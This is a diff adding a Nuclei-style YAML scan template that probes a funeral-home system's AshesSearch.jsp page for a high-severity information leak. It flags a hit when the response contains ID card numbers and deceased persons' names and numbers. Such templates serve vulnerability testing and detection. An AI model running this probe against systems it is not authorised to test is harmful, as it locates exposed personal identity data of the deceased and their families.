@@ -1,0 +1,24 @@
+id: bingyiguan-AshesSearch-info
+
+info:
+  name: 殡仪馆 AshesSearch.jsp 存在信息泄露漏洞
+  author: bingyiguan
+  severity: high
+  tags: bingyiguan
+
+http:
+  - raw:
+      - |+
+        GET /com/byg/ashes/AshesSearch.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '身份证'
+          - '逝者姓名'
+          - '逝者号码'
+        condition: and
